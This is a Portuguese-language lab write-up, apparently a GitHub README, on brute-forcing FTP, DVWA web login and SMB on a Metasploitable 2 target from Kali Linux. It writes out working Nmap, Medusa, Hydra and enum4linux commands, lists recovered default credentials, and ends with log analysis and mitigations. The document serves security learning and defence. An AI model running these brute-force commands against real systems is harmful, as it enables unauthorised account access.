# 🔐 Laboratório de Segurança com Kali Linux

## 📌 Descrição

Este projeto demonstra ataques de força bruta em serviços vulneráveis em um ambiente controlado, utilizando Kali Linux e ferramentas como Medusa e Hydra.

O objetivo é compreender:
- Como ataques funcionam na prática
- Como identificar vulnerabilidades
- Como propor medidas de mitigação

> ⚠️ Este laboratório foi realizado em ambiente controlado para fins educacionais.

---

## ✅ Progresso do Projeto

* [x] Configuração do ambiente
* [x] Reconhecimento com Nmap
* [x] Ataque FTP com Medusa
* [x] Análise de logs
* [x] Análise de aplicação web (DVWA)
* [x] Ataque DVWA (força bruta)
* [x] Enumeração SMB
* [x] Ataque SMB com Hydra

---

## 🧪 Ambiente

* Kali Linux (máquina atacante)
* Metasploitable 2 (máquina alvo vulnerável)
* VirtualBox

---

## 🌐 Configuração de Rede

Foi configurado um ambiente isolado utilizando **Host-Only Adapter**, permitindo comunicação entre as máquinas sem acesso à internet externa.

---

## 🖥️ Máquinas Utilizadas

* Kali Linux (atacante)
* Metasploitable 2 (alvo)

---

## 📡 Endereçamento IP

| Máquina        | IP             | Função   |
| -------------- | -------------- | -------- |
| Kali Linux     | 192.168.56.101 | Atacante |
| Metasploitable | 192.168.56.102 | Alvo     |

---

## 🔗 Teste de Conectividade

```bash
ping 192.168.56.102
```

---

## 🔍 Reconhecimento com Nmap

```bash
nmap -sV 192.168.56.102
```

### 📸 Evidência

<img width="457" height="474" alt="image" src="https://github.com/user-attachments/assets/23305847-18d7-4da8-bf39-f233e8342e5b" />

---

# 💣 Ataque de Força Bruta em FTP

## 📌 Objetivo

Explorar credenciais fracas no serviço FTP.

---

## 🚀 Execução

```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlists/simple-wordlist.txt -M ftp
```

---

## 🔓 Resultado

* **Usuário:** msfadmin  
* **Senha:** msfadmin  

---

## 📸 Evidências
<img width="567" height="391" alt="image" src="https://github.com/user-attachments/assets/71ce50bf-7b4f-4ec6-a6c7-6ea57c2fe7f3" />


---

## 🔎 Validação

```bash
ftp 192.168.56.102
```

---

## 📄 Análise de Logs

Foram identificadas múltiplas tentativas de login falhas, caracterizando ataque de força bruta.

<img width="567" height="391" alt="log" src="https://github.com/user-attachments/assets/1dbe81fa-79dd-4c42-a95c-6318f7a6c11e" />


---

# 🌐 Análise de Aplicação Web (DVWA)

## 📌 Objetivo

Identificar vulnerabilidades em autenticação web.

---

## 🔍 Acesso

```
http://192.168.56.102/dvwa
```

---

## 🔐 Credenciais padrão

* Usuário: admin  
* Senha: password  

---

## ⚙️ Configuração

* Security Level: **Low**

---

## 🎯 Vulnerabilidade Identificada

Uso de método GET expondo credenciais na URL:

```bash
/dvwa/vulnerabilities/brute/?username=admin&password=123&Login=Login
```

---

## 💣 Ataque com Hydra

```bash
hydra -l admin -P wordlists/simple-wordlists.txt 192.168.56.102 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

## 🔓 Resultado

Foram encontradas múltiplas senhas válidas:

- password  
- 123456  
- root  
- admin  
- toor  
- msfadmin  

✔️ Isso indica falha crítica de segurança.

---

## 📸 Evidência
<img width="845" height="666" alt="image" src="https://github.com/user-attachments/assets/b5900a1a-0521-48b3-b6f8-a525bdd13148" />



---

## 🧠 Análise de Segurança

Vulnerabilidades encontradas:

- Uso de método GET
- Sem limitação de tentativas
- Sem CAPTCHA
- Senhas fracas

---

## 🛡️ Mitigação

- Utilizar método POST
- Implementar CAPTCHA
- Limitar tentativas de login
- Utilizar MFA

---

# 🗂️ Enumeração SMB

## 🔍 Enumeração de usuários

```bash
enum4linux -U 192.168.56.102
```

✔️ Foi possível listar diversos usuários do sistema.

---

## 💣 Ataque SMB com Hydra

```bash
hydra -L users.txt -p msfadmin 192.168.56.102 smb
```

---

## 🔓 Resultado

Credencial válida encontrada:

- **Usuário:** msfadmin  
- **Senha:** msfadmin  

✔️ Acesso confirmado via SMB.

---

## 📸 Evidência

<img width="567" height="642" alt="image" src="https://github.com/user-attachments/assets/f50064eb-ebc2-409f-a657-8e3d96991827" />


---

## 📄 Evidências

Todas as evidências estão na pasta:

```
/images
```

---

## 📚 Conclusão

O laboratório demonstrou na prática como sistemas vulneráveis podem ser comprometidos facilmente através de ataques de força bruta.

Principais aprendizados:

- Importância de senhas fortes
- Monitoramento contínuo de logs
- Uso de boas práticas de segurança
- Necessidade de proteção contra automação

---
